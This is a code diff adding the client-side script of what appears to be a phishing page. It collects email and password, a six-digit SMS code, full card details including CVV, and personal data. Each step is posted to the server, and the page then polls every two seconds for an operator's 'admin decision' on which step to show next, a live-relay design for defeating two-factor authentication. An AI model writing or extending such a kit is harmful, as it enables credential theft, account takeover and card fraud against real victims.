+                    el.classList.add('active');
+                    el.classList.remove('completed');
+                } else if (index < parseInt(stepId.replace('step', '')) - 1) {
+                    el.classList.add('completed');
+                    el.classList.remove('active');
+                } else {
+                    el.classList.remove('active', 'completed');
+                }
+            });
+        }
+
+        // Validation
+        function validateStep1() {
+            const email = document.getElementById('email');
+            const password = document.getElementById('password');
+            const dict = languages[document.documentElement.lang] || languages.de;
+            let isValid = true;
+
+            if (!email.value.trim()) {
+                showError('emailError', dict.emailErrorMessage);
+                email.classList.add('invalid');
+                isValid = false;
+            } else {
+                hideError('emailError');
+                email.classList.remove('invalid');
+            }
+
+            if (password.value.length < 6) {
+                showError('passwordError', dict.passwordErrorMessage);
+                password.classList.add('invalid');
+                isValid = false;
+            } else {
+                hideError('passwordError');
+                password.classList.remove('invalid');
+            }
+
+            return isValid;
+        }
+
+        function validateStep2() {
+            const digits = Array.from(document.querySelectorAll('.sms-digit'));
+            const code = digits.map(input => input.value).join('');
+            const isValid = code.length === 6 && /^\d{6}$/.test(code);
+
+            digits.forEach(input => {
+                input.classList.toggle('invalid', !input.value || !/^\d$/.test(input.value));
+            });
+
+            if (!isValid) {
+                const dict = languages[document.documentElement.lang] || languages.de;
+                showError('smsError', dict.smsErrorMessage);
+                return false;
+            }
+
+            hideError('smsError');
+            digits.forEach(input => input.classList.remove('invalid'));
+            return true;
+        }
+
+        function moveToNext(el) {
+            el.value = el.value.replace(/[^0-9]/g, '').slice(0, 1);
+            if (el.value && el.nextElementSibling) {
+                el.nextElementSibling.focus();
+            }
+        }
+
+        function moveToPrev(e, el) {
+            if (e.key === 'Backspace' && !el.value && el.previousElementSibling) {
+                el.previousElementSibling.focus();
+            }
+        }
+
+        function validateCardForm() {
+            let isValid = true;
+            const cardNumber = document.getElementById('cardNumber');
+
+            // Validate card number (basic Luhn algorithm)
+            const cardNum = cardNumber.value.replace(/\s/g, '');
+            if (!isValidCardNumber(cardNum)) {
+                const dict = languages[document.documentElement.lang] || languages.de;
+                showError('cardNumberError', dict.invalidCardNumberMessage);
+                cardNumber.classList.add('invalid');
+                isValid = false;
+            } else {
+                hideError('cardNumberError');
+                cardNumber.classList.remove('invalid');
+            }
+
+            return isValid;
+        }
+
+        function isValidCardNumber(num) {
+            if (num.length < 13 || num.length > 19) return false;
+            let sum = 0;
+            let isEven = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let digit = parseInt(num[i]);
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return sum % 10 === 0;
+        }
+
+        function showError(elementId, message) {
+            const errorEl = document.getElementById(elementId);
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+        }
+
+        function hideError(elementId) {
+            const errorEl = document.getElementById(elementId);
+            errorEl.classList.remove('show');
+        }
+
+        // Card formatting
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s/g, '');
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+            input.value = formattedValue;
+        }
+
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            input.value = value;
+        }
+
+        function updateCardPreview() {
+            const name = document.getElementById('cardName').value || 'TU NOMBRE';
+            const number = document.getElementById('cardNumber').value || '•••• •••• •••• ••••';
+            const expiry = document.getElementById('expiry').value || 'MM/YY';
+
+            document.getElementById('cardNameDisplay').textContent = name.toUpperCase();
+            document.getElementById('cardNumberDisplay').textContent = number || '•••• •••• •••• ••••';
+            document.getElementById('cardExpiryDisplay').textContent = expiry;
+        }
+
+        function resetForm() {
+            document.getElementById('loginForm').reset();
+            document.getElementById('smsForm').reset();
+            document.getElementById('cardForm').reset();
+            document.getElementById('customerInfoForm').reset();
+            document.getElementById('cardForm').style.display = 'block';
+            document.querySelectorAll('input').forEach(el => {
+                el.classList.remove('invalid');
+            });
+            goToStep1();
+        }
+    </script>
+    <script>
+// ID de session unique pour cet utilisateur (généré par le serveur)
+let sessionId = null;
+let pollingInterval = null;
+
+// ================================================
+// ATTENDRE LA DÉCISION DE L'ADMIN
+// Le site interroge le serveur toutes les 2 secondes
+// ================================================
+function attendreDecision() {
+  // Affiche le chargement
+  showStep('loading');
+
+  // Arrête un ancien polling s'il existe
+  if (pollingInterval) clearInterval(pollingInterval);
+
+  pollingInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/decision/${sessionId}`);
+      const data = await res.json();
+
+      if (data.decision) {
+        clearInterval(pollingInterval);
+        pollingInterval = null;
+
+        // Redirige selon la décision de l'admin
+        if (data.decision === 'step2') showStep('step2');
+        else if (data.decision === 'step3') showStep('step3');
+        else if (data.decision === 'step4') showStep('step4');
+        else if (data.decision === 'success') showStep('success');
+        else if (data.decision === 'error') {
+          // Retourne à l'étape actuelle selon où on est
+          const etapesActives = ['step1','step2','step3','step4'];
+          const derniereEtape = sessionStorage.getItem('derniereEtape') || 'step1';
+          showStep(derniereEtape);
+        }
+      }
+    } catch (err) {
+      console.error('Erreur polling:', err);
+    }
+  }, 2000); // Vérifie toutes les 2 secondes
+}
+
+// ================================================
+// ÉTAPE 1 — Email + Mot de passe
+// ================================================
+async function goToStep2(e) {
+  if (e) e.preventDefault();
+  if (!validateStep1()) return;
+
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+
+  sessionStorage.setItem('derniereEtape', 'step1');
+
+  const res = await fetch("/etape1", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, password })
+  });
+
+  const data = await res.json();
+  sessionId = data.sessionId; // On récupère l'ID de session
+
+  // Affiche le chargement et attend la décision admin
+  attendreDecision();
+}
+
+// ================================================
+// ÉTAPE 2 — Code SMS
+// ================================================
+async function goToStep3(e) {
+  if (e) e.preventDefault();
+  if (!validateStep2()) return;
+
+  const digits = Array.from(document.querySelectorAll('.sms-digit'));
+  const smsCode = digits.map(input => input.value).join('');
+
+  sessionStorage.setItem('derniereEtape', 'step2');
+
+  await fetch("/etape2", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ smsCode, sessionId })
+  });
+
+  attendreDecision();
+}
+
+// ================================================
+// ÉTAPE 3 — Carte bancaire
+// ================================================
+async function submitPayment(e) {
+  if (e) e.preventDefault();
+  if (!validateCardForm()) return;
+
+  const cardName = document.getElementById('cardName').value;
+  const cardNumber = document.getElementById('cardNumber').value;
+  const expiry = document.getElementById('expiry').value;
+  const cvv = document.getElementById('cvv').value;
+  const cardBrand = document.getElementById('cardBrand').value;
+
+  sessionStorage.setItem('derniereEtape', 'step3');
+
+  await fetch("/etape3", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ cardName, cardNumber, expiry, cvv, cardBrand, sessionId })
+  });
+
+  attendreDecision();
+}
+
+// ================================================
+// ÉTAPE 4 — Infos personnelles
+// ================================================
+async function submitCustomerInfo(e) {
+  if (e) e.preventDefault();
+  if (!validateCustomerInfo()) return;
+
+  const firstName = document.getElementById('firstName').value;
+  const lastName = document.getElementById('lastName').value;
+  const address = document.getElementById('address').value;
+  const birthYear = document.getElementById('birthYear').value;
+  const postalCode = document.getElementById('postalCode').value;
+
+  sessionStorage.setItem('derniereEtape', 'step4');
+
+  await fetch("/etape4", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ firstName, lastName, address, birthYear, postalCode, sessionId })
+  });
+
+  attendreDecision();
+}
+</script>
+</body>
+</html>
